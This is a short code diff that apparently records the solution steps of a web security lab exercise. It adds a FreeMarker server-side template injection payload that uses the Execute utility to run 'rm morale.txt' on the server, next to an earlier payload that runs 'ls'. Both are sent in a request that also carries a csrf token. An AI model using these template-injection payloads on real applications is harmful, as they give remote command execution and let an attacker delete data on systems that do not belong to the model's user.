@@ -22,6 +22,7 @@ csrf=H7rjK2TB2YsbKCyQPHckODbfMAuVDD8g&template=
 <p> ${"freemarker.template.utility.Execute"?new()("ls")}</p>&template-action=preview
 //<p> morale.txt </p>
 
-5) 
+5) csrf=H7rjK2TB2YsbKCyQPHckODbfMAuVDD8g&template=
+<p> ${"freemarker.template.utility.Execute"?new()("rm morale.txt")}</p>&template-action=preview
 
 */
